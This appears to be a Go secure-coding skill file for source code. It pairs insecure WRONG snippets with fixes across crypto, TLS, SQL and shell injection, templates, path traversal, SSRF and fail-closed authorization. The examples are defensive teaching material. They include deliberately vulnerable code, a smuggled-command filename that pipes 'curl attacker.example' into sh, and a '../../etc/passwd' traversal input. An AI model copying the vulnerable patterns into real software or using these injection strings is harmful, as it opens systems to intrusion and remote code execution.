---
name: go-security
description: >-
  Go security practice for input from outside the process: crypto/rand and rand.Text for anything
  that grants access, TLS verification left on, bcrypt or argon2 for passwords and
  subtle.ConstantTimeCompare for secrets, parameterized SQL including ORDER BY and table names,
  exec.Command argument lists rather than a shell, html/template, os.Root against path traversal,
  SSRF checks in the dialer, bounded bodies and server timeouts, CSRF protection, secrets kept out
  of logs, govulncheck, and failing closed. Use when Go code handles a request body, a filename,
  a URL to fetch, an exec.Command argument, a password, a token, an upload or a template.
paths:
  - "**/*.go"
  - "**/go.mod"
---

# Security

## Randomness

- **Anything that grants access comes from `crypto/rand`** — session IDs, reset tokens, API keys,
  nonces. `crypto/rand.Text()` returns a base32 string with at least 128 bits of randomness, which
  is the right default for a token.
- **`math/rand/v2` is for simulations, jitter and sampling** — never for a value an attacker gains
  by guessing. `gosec` G404 reports every call, so legitimate uses carry `//nolint:gosec // jitter,
  not a secret` — or the project excludes G404 for the one package that computes backoff.

```go
// WRONG — math/rand/v2 promises nothing about guessing, and 64 bits is half a token
token := strconv.FormatUint(rand.Uint64(), 36)

// CORRECT — at least 128 bits from crypto/rand, base32-encoded
token := rand.Text()
```

## Secrets and Credentials

- **Passwords are hashed with an adaptive function** — `golang.org/x/crypto/bcrypt` or `argon2id` —
  never a bare SHA-256, salted or not: a GPU tries billions of SHA-256 guesses a second.

```go
// WRONG — a GPU tries billions of SHA-256 guesses a second, salted or not
sum := sha256.Sum256([]byte(salt + password))

// CORRECT — slow by design, with the salt and the cost stored inside the hash
hash, err := bcrypt.GenerateFromPassword([]byte(password), bcrypt.DefaultCost)
if err != nil {
	return nil, fmt.Errorf("hash password: %w", err)
}
```

- **A secret is compared with `subtle.ConstantTimeCompare`**, never `==` or `bytes.Equal`, which
  return as soon as one byte differs and leak the prefix through timing. Compare hashes of equal
  length.

```go
// WRONG — == returns at the first byte that differs, and the timing says how many matched
func isValidAPIKey(presented, expected string) bool {
	return presented == expected
}

// CORRECT — hashes of equal length, compared in constant time
func isValidAPIKey(presented, expected string) bool {
	presentedSum, expectedSum := sha256.Sum256([]byte(presented)), sha256.Sum256([]byte(expected))
	return subtle.ConstantTimeCompare(presentedSum[:], expectedSum[:]) == 1
}
```

- **Secrets come from the environment or a secret store at startup**, never from code, a default,
  or a committed file; a type holding one redacts itself in logs (`logging.md`).
- **TLS verification stays on.** `InsecureSkipVerify: true` is a finding in every context outside
  a test against a throwaway certificate; trust a private CA by adding it to `RootCAs`.

```go
// WRONG — any certificate is accepted: anyone on the path can read and change the traffic
transport := &http.Transport{
	TLSClientConfig: &tls.Config{InsecureSkipVerify: true, MinVersion: tls.VersionTLS12},
}

// CORRECT — the private CA is trusted beside the system roots, and verification stays on
roots, err := x509.SystemCertPool()
if err != nil {
	return nil, fmt.Errorf("load system roots: %w", err)
}
if !roots.AppendCertsFromPEM(caPEM) {
	return nil, errors.New("add private CA: no certificate in PEM")
}
transport := &http.Transport{
	TLSClientConfig: &tls.Config{RootCAs: roots, MinVersion: tls.VersionTLS12},
}
```

## Injection

- **SQL takes parameters, always**: `db.QueryContext(ctx, "SELECT … WHERE email = $1", email)`.
  Identifiers cannot be parameters — an `ORDER BY` column or a table name is chosen from a fixed
  map of allowed values, never formatted in from input.

```go
// WRONG — the input is SQL, and whatever the client sent after the column name runs too
query := "SELECT id, total_cents FROM orders ORDER BY " + sortBy + " LIMIT $1"

// CORRECT — the input only chooses among columns this code wrote
var orderColumnBySortKey = map[string]string{
	"newest":  "created_at DESC",
	"largest": "total_cents DESC",
}

column, ok := orderColumnBySortKey[sortBy]
if !ok {
	return nil, fmt.Errorf("list orders by %q: %w", sortBy, ErrUnknownSortKey)
}
query := "SELECT id, total_cents FROM orders ORDER BY " + column + " LIMIT $1"
```

- **A subprocess gets an argument list, never a shell string**, and `--` before anything a user
  controls:

```go
// WRONG — a filename such as "x; curl attacker.example | sh" is a second command
cmd := exec.CommandContext(ctx, "sh", "-c", "git log --format=%H -- "+path)

// CORRECT — one argument per item, and "--" stops a name such as "-p" being read as an option
cmd := exec.CommandContext(ctx, "git", "log", "--format=%H", "--", path)
```

- **HTML is rendered with `html/template`**, which escapes by context — element, attribute, URL,
  script. `text/template` writing HTML is an XSS, and so is converting input to `template.HTML`.

```go
// WRONG — template.HTML tells html/template the text is already safe: a <script> in the bio runs
type profilePage struct {
	Bio template.HTML
}

page := profilePage{Bio: template.HTML(user.Bio)}

// CORRECT — a plain string, escaped for wherever the template places it
type profilePage struct {
	Bio string
}

page := profilePage{Bio: user.Bio}
```

- **Untrusted archives, images and XML are parsed with limits**: decompressed size capped by an
  `io.LimitReader`, image dimensions checked with `image.DecodeConfig` before `Decode`.

```go
// WRONG — a megabyte of gzip can decompress into gigabytes, all of it in memory
data, err := io.ReadAll(gz)

// CORRECT — one byte past the cap is read, so an upload at the cap is told from one beyond it
data, err := io.ReadAll(io.LimitReader(gz, maxDecompressedBytes+1))
if err != nil {
	return nil, fmt.Errorf("decompress upload: %w", err)
}
if len(data) > maxDecompressedBytes {
	return nil, errors.New("decompress upload: larger than the limit")
}
```

## Paths

- **A filename from outside is opened inside an `os.Root`** (Go 1.24): `root.Open(name)` refuses
  any name — `..`, an absolute path, a symlink — that resolves outside the root, which string
  checks on the joined path get wrong in both directions.

```go
// WRONG — "../../etc/passwd" is joined and cleaned into a path outside the upload directory
file, err := os.Open(filepath.Join(uploadDir, name))

// CORRECT — the root refuses any name that resolves outside it, symlinks included
root, err := os.OpenRoot(uploadDir)
if err != nil {
	return fmt.Errorf("open upload directory: %w", err)
}
defer root.Close()
file, err := root.Open(name)
```

- **`filepath.IsLocal(name)`** is the check when the name is only stored or forwarded, not opened.

```go
// WRONG — rejects "v1..2.txt", accepts "/etc/passwd"
if strings.Contains(name, "..") {
	return fmt.Errorf("store attachment %q: %w", name, ErrInvalidName)
}

// CORRECT — false for an escape upwards, an absolute path, an empty name, and NUL on Windows
if !filepath.IsLocal(name) {
	return fmt.Errorf("store attachment %q: %w", name, ErrInvalidName)
}
```

- **An `embed.FS` or `fs.Sub` serves static files** — never `http.FileServer(http.Dir("."))` over a
  directory that also holds configuration.

## Outbound Requests to URLs from Input

A URL a user supplies — a webhook, an avatar, an import — can point at the metadata service, at
`localhost` or at the internal network. **The check belongs in the dialer**, after DNS resolution,
because a name that resolves to a public address at validation time can resolve to `127.0.0.1` at
connection time, and a redirect can go anywhere:

- **A `net.Dialer.Control` function rejects private, loopback, link-local and unspecified
  addresses** — `netip.Addr` has `IsPrivate`, `IsLoopback`, `IsLinkLocalUnicast`,
  `IsUnspecified` — and every redirect goes through the same dialer.
- **The client for such URLs is separate** from the one that talks to your own services, with a
  short timeout, a response size limit and a redirect limit.
- **Only `https`** — and `http` only where a test needs it — checked on the parsed `*url.URL`.

```go
// CORRECT — the dialer sees the resolved address, for the first request and every redirect
dialer := &net.Dialer{
	Timeout: 5 * time.Second,
	Control: func(network, address string, _ syscall.RawConn) error {
		addrPort, err := netip.ParseAddrPort(address)
		if err != nil {
			return fmt.Errorf("parse dial address %q: %w", address, err)
		}
		if isInternal(addrPort.Addr()) {
			return fmt.Errorf("dial %s: %w", addrPort.Addr(), ErrInternalAddress)
		}
		return nil
	},
}
client := &http.Client{
	Timeout:   10 * time.Second,
	Transport: &http.Transport{DialContext: dialer.DialContext},
}

func isInternal(addr netip.Addr) bool {
	addr = addr.Unmap()
	return addr.IsPrivate() || addr.IsLoopback() || addr.IsLinkLocalUnicast() ||
		addr.IsUnspecified()
}
```

`Unmap` is there for `IsUnspecified`, which does not see `::ffff:0.0.0.0` as the `0.0.0.0` it is;
the other three predicates already look through the mapping. The `Transport` is built rather than
cloned from `http.DefaultTransport`, whose `Proxy` would route the request through a proxy, and
the dialer would check the proxy's address instead of the target's.

## Request Limits

- **Bodies are bounded, servers set their timeouts, and browser-facing state changes sit behind
  `http.CrossOriginProtection`** — the mechanics are in `go-boundaries` and `go-http`; a server
  without them is held open by a client that sends one byte a minute.
- **Cookies carrying a session are `Secure`, `HttpOnly` and `SameSite=Lax`** or stricter.

```go
// WRONG — readable by any script on the page, and sent over plain HTTP
http.SetCookie(w, &http.Cookie{Name: "session", Value: sessionID, Path: "/"})

// CORRECT
http.SetCookie(w, &http.Cookie{
	Name:     "session",
	Value:    sessionID,
	Path:     "/",
	Secure:   true,
	HttpOnly: true,
	SameSite: http.SameSiteLaxMode,
})
```

## Failing Closed

- **An authorization check that errors denies.** `allowed, err := policy.Allow(…)` with an error
  returns 500 or 403, never falls through to the handler.

```go
// WRONG — only a definite "no" denies: while the policy service is down, everyone may refund
allowed, err := h.policy.Allow(r.Context(), user, ActionRefund)
if err == nil && !allowed {
	writeError(w, http.StatusForbidden, "not allowed")
	return
}

// CORRECT — an error denies too
allowed, err := h.policy.Allow(r.Context(), user, ActionRefund)
if err != nil {
	h.logger.ErrorContext(r.Context(), "policy check failed", "user_id", user.ID, "error", err)
	writeError(w, http.StatusInternalServerError, "internal error")
	return
}
if !allowed {
	writeError(w, http.StatusForbidden, "not allowed")
	return
}
```

- **A missing security setting stops startup** — no TLS certificate, no signing key, no allowed
  origins list — rather than running without it.

```go
// WRONG — a missing key falls back to one every clone of the repository knows
sessionKey := getenv("SESSION_KEY")
if sessionKey == "" {
	sessionKey = "dev-only-session-key"
}

// CORRECT — a missing key stops startup
sessionKey := getenv("SESSION_KEY")
if sessionKey == "" {
	return settings{}, errors.New("load settings: SESSION_KEY is not set")
}
```
- **Errors returned to the client say what the client can fix**, nothing about the server: no
  stack trace, no SQL, no file path, no `err.Error()` of an internal failure.

## Dependencies

- **`govulncheck ./...` runs in CI** and reports only the vulnerabilities whose code the program
  actually reaches. A finding is fixed by upgrading; a suppression names the advisory and why the
  path is unreachable.
- **`gosec` runs with the other linters**, and a `//nolint:gosec` names the rule and the reason
  the input is trusted.
